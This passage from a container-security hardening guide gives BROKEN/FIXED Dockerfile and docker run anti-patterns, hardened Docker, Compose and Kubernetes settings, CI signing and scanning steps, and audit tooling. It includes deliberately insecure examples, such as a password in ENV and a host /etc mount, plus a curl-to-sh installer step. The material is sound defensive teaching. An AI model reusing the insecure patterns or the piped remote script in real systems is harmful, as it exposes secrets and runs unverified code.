ENV DB_PASSWORD=$DB_PASSWORD
```

```bash
docker history myimage    # ← exposes the password literal
```

```dockerfile
# FIXED — use BuildKit secret mounts (above) or runtime env injection
```

### ENTRYPOINT shell-form quoting

```dockerfile
# BROKEN — shell form, args get word-split, signal handling lost
ENTRYPOINT /app/server --port 8080 --config /etc/app.yaml

# FIXED — exec form
ENTRYPOINT ["/app/server", "--port", "8080", "--config", "/etc/app.yaml"]
# Or use exec form + CMD for default args
ENTRYPOINT ["/app/server"]
CMD ["--port", "8080", "--config", "/etc/app.yaml"]
```

### CMD vs ENTRYPOINT confusion

```dockerfile
# BROKEN — ENTRYPOINT shell form intercepts signals; container won't stop on SIGTERM
ENTRYPOINT /app/server

# FIXED — exec form keeps PID 1 as your binary
ENTRYPOINT ["/app/server"]
# Optionally use tini for proper PID 1 / signal-handling
ENTRYPOINT ["/sbin/tini","--","/app/server"]
```

### Mounting /etc on host

```bash
# BROKEN
docker run -v /etc:/host-etc myimage          # leaks shadow, sudoers, ssh hostkeys

# FIXED — mount only what you need, read-only
docker run -v /etc/ssl/certs:/etc/ssl/certs:ro myimage
```

### Running databases as root

```dockerfile
# BROKEN
FROM postgres:16
# postgres image runs as postgres user by default — but if you override:
USER root
```

```dockerfile
# FIXED — leave default USER alone, use named volume
# Verify
docker run --rm postgres:16 id
# uid=999(postgres)
```

## Hardened Defaults

A copy-pasteable baseline. Every flag here removes a category of attack. Audit failures of any flag below before relaxing.

### Recommended Runtime Flags

```bash
docker run \
  --read-only \
  --tmpfs /tmp:rw,nosuid,nodev,size=64m \
  --tmpfs /run:rw,nosuid,nodev,size=16m \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --security-opt no-new-privileges \
  --security-opt seccomp=runtime/default \
  --security-opt apparmor=docker-default \
  --user 65534:65534 \
  --pids-limit 100 \
  --memory 256m \
  --memory-swap 256m \
  --cpus 0.5 \
  --network app-net \
  --restart on-failure:3 \
  --log-driver json-file \
  --log-opt max-size=10m \
  --log-opt max-file=3 \
  --health-cmd 'curl -f http://localhost:8080/health || exit 1' \
  --health-interval 30s \
  ghcr.io/myorg/myapp@sha256:abc...
```

### Compose Equivalent

```yaml
# docker-compose.yml
services:
  app:
    image: ghcr.io/myorg/myapp@sha256:abc...
    read_only: true
    tmpfs:
      - /tmp:rw,nosuid,nodev,size=64m
      - /run:rw,nosuid,nodev,size=16m
    cap_drop: [ALL]
    cap_add: [NET_BIND_SERVICE]
    security_opt:
      - no-new-privileges:true
      - seccomp=runtime/default
      - apparmor=docker-default
    user: "65534:65534"
    pids_limit: 100
    mem_limit: 256m
    memswap_limit: 256m
    cpus: 0.5
    networks: [app-net]
    restart: on-failure:3
    logging:
      driver: json-file
      options:
        max-size: "10m"
        max-file: "3"
    healthcheck:
      test: ["CMD-SHELL","curl -f http://localhost:8080/health || exit 1"]
      interval: 30s
networks:
  app-net:
    driver: bridge
    internal: false
```

### Kubernetes Equivalent

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hardened-app
spec:
  replicas: 3
  selector:
    matchLabels: {app: hardened}
  template:
    metadata:
      labels: {app: hardened}
    spec:
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 65534
        fsGroup: 65534
        seccompProfile: {type: RuntimeDefault}
      containers:
      - name: app
        image: ghcr.io/myorg/myapp@sha256:abc...
        imagePullPolicy: Always
        ports: [{containerPort: 8080}]
        securityContext:
          runAsNonRoot: true
          runAsUser: 65534
          readOnlyRootFilesystem: true
          allowPrivilegeEscalation: false
          capabilities:
            drop: [ALL]
            add: [NET_BIND_SERVICE]
          seccompProfile: {type: RuntimeDefault}
        resources:
          limits: {cpu: 500m, memory: 256Mi, ephemeral-storage: 1Gi}
          requests: {cpu: 100m, memory: 128Mi}
        livenessProbe:
          httpGet: {path: /health, port: 8080}
          periodSeconds: 30
        readinessProbe:
          httpGet: {path: /ready, port: 8080}
        volumeMounts:
        - {name: tmp, mountPath: /tmp}
        - {name: run, mountPath: /run}
      volumes:
      - name: tmp
        emptyDir: {medium: Memory, sizeLimit: 64Mi}
      - name: run
        emptyDir: {medium: Memory, sizeLimit: 16Mi}
```

## Idioms

### Multi-Stage Build with Non-Root Final Image

```dockerfile
# syntax=docker/dockerfile:1.7
FROM golang:1.22-bookworm AS build
WORKDIR /src
COPY go.* ./
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    go mod download
COPY . .
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    CGO_ENABLED=0 GOOS=linux go build -ldflags='-s -w -extldflags=-static' -o /out/app .

FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=build /out/app /app
USER nonroot:nonroot
EXPOSE 8080
ENTRYPOINT ["/app"]
```

### Run as nobody

```bash
# At image build time
USER 65534:65534

# At runtime override
docker run --user 65534:65534 myimage
docker run --user nobody:nogroup myimage    # if /etc/passwd has it
```

### Verify Image Signatures in CI

```yaml
# .github/workflows/deploy.yml
jobs:
  verify-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: sigstore/cosign-installer@v3
      - name: Verify
        run: |
          cosign verify \
            --certificate-identity 'https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main' \
            --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
            ghcr.io/myorg/myapp@sha256:${{ inputs.digest }}
      - name: Deploy
        run: kubectl set image deployment/app app=ghcr.io/myorg/myapp@sha256:${{ inputs.digest }}
```

### Trivy in CI Gate

```yaml
- name: Build
  run: docker build -t myapp:${{ github.sha }} .

- name: Scan
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: myapp:${{ github.sha }}
    severity: HIGH,CRITICAL
    exit-code: 1
    ignore-unfixed: true
    format: sarif
    output: trivy.sarif

- name: Upload SARIF
  if: always()
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: trivy.sarif
```

### Immutable Tag via Digest

```bash
# Capture digest after push
docker push ghcr.io/myorg/myapp:1.2.3
# ghcr.io/myorg/myapp:1.2.3 sha256:abc123...

# Reference by digest only (immutable)
docker pull ghcr.io/myorg/myapp@sha256:abc123...

# In Dockerfile
FROM ghcr.io/myorg/myapp@sha256:abc123...

# In K8s
image: ghcr.io/myorg/myapp@sha256:abc123...
```

### Generate SBOM at Build Time

```dockerfile
# syntax=docker/dockerfile:1.7
FROM alpine:3.19 AS build
RUN apk add --no-cache curl jq

# Install syft
RUN curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Build app...
COPY . /src
WORKDIR /src
RUN syft dir:/src -o cyclonedx-json > /sbom.cdx.json
```

```bash
# Or with buildx
docker buildx build --sbom=true --provenance=true -t myimage --push .
```

### Periodic Re-scan of Deployed Images

```bash
# Cron in CI
trivy image --severity HIGH,CRITICAL --exit-code 0 \
  --format json --output /tmp/scan.json \
  ghcr.io/myorg/myapp@sha256:abc...

# Pipe into alerting
jq '.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")' /tmp/scan.json | \
  curl -X POST -H 'Content-Type: application/json' -d @- $SLACK_WEBHOOK
```

### Drop CAP_NET_RAW If You Don't Use ICMP

```bash
# CAP_NET_RAW is in Docker default keep set, but most apps don't need it
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE myapp
# Adversary can't run nmap, ping sweeps, raw-socket scanners
```

### Ephemeral Containers for Debugging

```bash
# Pod
kubectl debug -it pod/myapp --image=nicolaka/netshoot --target=app

# With shared process namespace
kubectl debug -it pod/myapp --image=nicolaka/netshoot --target=app --share-processes --copy-to=myapp-debug
```

### Audit Existing Cluster

```bash
# kube-bench
kube-bench --benchmark cis-1.8

# kube-hunter (active scan)
kube-hunter --remote $CLUSTER_IP

# kubeaudit
kubeaudit all --kubeconfig ~/.kube/config

# polaris
polaris audit --audit-path ./manifests/

# kubescape
kubescape scan framework nsa
kubescape scan framework mitre
```

### Use Pod Security Admission

```bash
# Apply baseline at namespace level
kubectl label ns myns \
  pod-security.kubernetes.io/enforce=baseline \
  pod-security.kubernetes.io/warn=restricted

# Audit-only at cluster level (won't block, just warns)
kubectl edit ns kube-system    # don't enforce on system ns
```

### Restrict Image Pull Sources

```yaml
# OPA / Kyverno policy: only allow images from approved registries
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-image-registries
spec:
  validationFailureAction: enforce
  rules:
  - name: validate-registries
    match:
      any:
      - resources:
          kinds: [Pod]
    validate:
      message: "Only ghcr.io/myorg or registry.k8s.io images allowed"
      pattern:
        spec:
          containers:
          - image: "ghcr.io/myorg/* | registry.k8s.io/*"
```

### Audit Logs

```bash
# Docker daemon audit (Linux auditd)
sudo auditctl -w /usr/bin/docker -k docker
sudo auditctl -w /var/lib/docker -k docker
sudo auditctl -w /etc/docker -k docker
sudo auditctl -w /usr/lib/systemd/system/docker.service -k docker

# Kubernetes API audit
# /etc/kubernetes/audit-policy.yaml
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  resources:
  - group: ""
    resources: ["secrets","pods/exec","pods/portforward"]
- level: Metadata
  resources:
  - group: ""
    resources: ["*"]
```

### Block CAP_SYS_PTRACE for Production

```bash
# Even with NET_RAW dropped, ptrace alone is dangerous
docker run --cap-drop ALL --security-opt seccomp=runtime/default myapp
# Default seccomp blocks ptrace anyway, but be explicit
```

### Pin Sub-images in Compose

```yaml
services:
  app:
    image: ghcr.io/myorg/myapp@sha256:abc123...
    init: true                    # use tini for PID 1
    stop_grace_period: 30s
    stop_signal: SIGTERM
```

### Limit Mount Sources

```bash
# Avoid host bind mounts; use named volumes or tmpfs
docker volume create app-data
docker run -v app-data:/var/lib/app myapp

# Read-only host mount where possible
docker run -v /etc/myapp/config:/etc/app/config:ro myapp
```

### Disable Inter-Container Communication

```bash
# Default bridge ICC = true; set to false on user-defined bridges
docker network create --opt com.docker.network.bridge.enable_icc=false isolated-net
```

### Set ulimits

```bash
docker run --ulimit nofile=1024:2048 \
           --ulimit nproc=256:512 \
           --ulimit core=0 \
           myapp
```

### Verify with cdk

```bash
# CDK is a container security tool that scans for misconfigurations
cdk evaluate --full
cdk evaluate -t mount-docker-sock,privileged-mode
```

### Trivy Misconfig + Helm

```bash
helm template myrelease ./mychart > /tmp/manifests.yaml
trivy config /tmp/manifests.yaml
```

## See Also

docker, kubectl, kubectl-debug, ssh, openssl, age, gpg, vault, polyglot

## References

- Docker Engine Security: https://docs.docker.com/engine/security/
- Kubernetes Security Concepts: https://kubernetes.io/docs/concepts/security/
- Sigstore: https://sigstore.dev
- SLSA: https://slsa.dev
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker
- NIST SP 800-190 Application Container Security Guide: https://csrc.nist.gov/publications/detail/sp/800-190/final
- Falco: https://falco.org/
- Trivy: https://github.com/aquasecurity/trivy
- Cosign: https://github.com/sigstore/cosign
- Syft: https://github.com/anchore/syft
- Grype: https://github.com/anchore/grype
- OCI Runtime Spec: https://github.com/opencontainers/runtime-spec
- OCI Image Spec: https://github.com/opencontainers/image-spec
- OCI Distribution Spec: https://github.com/opencontainers/distribution-spec
- Kubernetes Pod Security Standards: https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Kyverno: https://kyverno.io/
- OPA Gatekeeper: https://open-policy-agent.github.io/gatekeeper/
- Tetragon: https://tetragon.io/
- Tracee: https://aquasecurity.github.io/tracee/
- Sysbox: https://github.com/nestybox/sysbox
- gVisor: https://gvisor.dev/
- Kata Containers: https://katacontainers.io/
- Buildkit: https://github.com/moby/buildkit
- Distroless Images: https://github.com/GoogleContainerTools/distroless
- Chiseled Ubuntu: https://canonical.com/blog/chiselled-ubuntu-ga
- Docker Bench Security: https://github.com/docker/docker-bench-security
- AppArmor Wiki: https://gitlab.com/apparmor/apparmor/-/wikis/home
- SELinux Project: https://github.com/SELinuxProject/selinux-notebook
- in-toto: https://in-toto.io/
- CycloneDX: https://cyclonedx.org/
- SPDX: https://spdx.dev/
- Rekor: https://github.com/sigstore/rekor
- Fulcio: https://github.com/sigstore/fulcio
